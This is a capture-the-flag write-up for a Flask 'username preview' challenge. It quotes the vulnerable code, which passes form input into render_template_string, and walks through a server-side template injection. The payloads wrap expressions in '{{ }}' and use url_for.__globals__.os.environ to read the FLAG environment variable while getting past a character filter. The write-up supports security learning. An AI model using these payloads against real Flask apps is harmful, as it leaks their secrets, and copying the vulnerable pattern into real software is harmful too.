# Username Decorator (not ez)

#### Description

Author: JW/Mani

My favorite social media platform, Prorope, has overhauled their username system and now supports prefixes and suffixes! Isn't that so cool?

For one, I know that I would really love to be *the* !! JW !!, so I made a website to preview these username changes.

**Note: the flag is in an environment variable is called `FLAG`**

#### Files

[App.py](./src/app.py)
------

### solve

First line shows the flag is hidden in environment vars, and the code to retrieve it as a string in app configuration:

```python
app.config['FLAG_LOCATION'] = 'os.getenv("FLAG")'
```

reading the code we figure out we can inject code in the template, SSTI (Server-Side Template Injection)

```python
def index():
    prefix = ''
    username = ''
    suffix = ''
  
    if request.method == 'POST':
      prefix = (request.form['prefix'] or '')[:2]
      username = request.form['username'] or ''
      suffix = (request.form['suffix'] or '')[:2]
      if not validate_username(username): username = 'Invalid Username'

    template = '<!DOCTYPE html><html><body>\
    <form action="" method="post">\
      Prefix: <input name="prefix"> <br>\
      Username: <input name="username"> <br>\
      Suffix: <input name="suffix"> <br> \
      <input type="submit" value="Preview!">\
    </form><h2>%s %s %s</h2></body></html>' % (prefix, username, suffix)
    return render_template_string(template)
```

we can inject a two letter `prefix` and `suffix` and the code in the `username`
*BUT* there are some input checking on our `username`

```python
def validate_username(username):
  return bool(re.fullmatch("[a-zA-Z0-9._\[\]\(\)\-=,]{2,}", username))
```

as a flask app we figure that the `prefix` is `{{` and `}}` as `suffix` and username would be python to retrieve environment variable `FLAG`.

Problem 1:
    `os` library is not imported.
        solution:
            we can use `__import__('os').getenv('FLAG')`

Problem 2:
username can't have nor single or double quotes.
    solution:
        we can use  `url_for.__globals__.os.__dict__` and `ctr + f` for `FLAG`
        or `url_for.__globals__.os.environ` or `url_for.__globals__.os.environ.FLAG`

**ctf{j4st_us3_pr0p3r_t3mp14t1ng_4lr34dy}**
